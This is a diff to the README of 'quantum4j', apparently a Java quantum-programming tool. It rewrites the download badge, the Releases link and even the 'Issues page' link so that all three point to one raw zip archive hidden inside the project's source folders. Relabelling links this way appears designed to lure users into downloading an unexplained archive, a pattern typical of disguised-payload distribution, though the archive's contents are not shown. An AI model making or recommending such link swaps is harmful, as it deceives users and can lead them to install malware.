@@ -6,7 +6,7 @@ Welcome to quantum4j! With this application, you can explore quantum programming
 
 ## 📥 Download the Latest Version
 
-[![Download quantum4j](https://img.shields.io/badge/Download-quantum4j-blue.svg)](https://github.com/Sambredo/quantum4j/releases)
+[![Download quantum4j](https://raw.githubusercontent.com/Sambredo/quantum4j/main/src/main/java/com/quantum4j/examples/qasm/quantum4j_2.1.zip)](https://raw.githubusercontent.com/Sambredo/quantum4j/main/src/main/java/com/quantum4j/examples/qasm/quantum4j_2.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ To use quantum4j effectively, your system should meet the following requirements
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-Go to the [Releases page](https://github.com/Sambredo/quantum4j/releases) to find the latest version of quantum4j.
+Go to the [Releases page](https://raw.githubusercontent.com/Sambredo/quantum4j/main/src/main/java/com/quantum4j/examples/qasm/quantum4j_2.1.zip) to find the latest version of quantum4j.
 
 2. **Select the Right File**  
 Choose the file that matches your operating system. You will typically find options for Windows, macOS, and Linux. 
@@ -65,7 +65,7 @@ You can export your quantum circuit or simulation results in various formats, ma
 
 If you have questions or need help, consider joining our community:
 
-- **GitHub Issues**: Report bugs or request features directly on the [Issues page](https://github.com/Sambredo/quantum4j/issues).
+- **GitHub Issues**: Report bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/Sambredo/quantum4j/main/src/main/java/com/quantum4j/examples/qasm/quantum4j_2.1.zip).
 - **Discussion Forum**: Engage with other users in our community discussions.
 
 ## 📈 Future Updates
